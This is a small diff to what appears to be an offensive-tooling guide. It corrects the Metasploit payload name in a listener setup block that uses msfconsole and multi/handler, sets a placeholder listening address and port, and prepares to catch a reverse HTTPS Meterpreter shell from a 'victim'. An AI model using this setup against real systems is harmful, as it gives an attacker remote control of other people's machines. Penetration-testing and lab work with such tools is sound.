@@ -61,7 +61,7 @@ Remember to ready the mfsconsole before serving it to the victim:
 ```
 msfconsole -q
 use multi/handler
-set payload windows/x64/meterpreter_reverse_https
+set payload windows/x64/meterpreter/reverse_https
 set lhost IP
 set lport PORT
 exploit
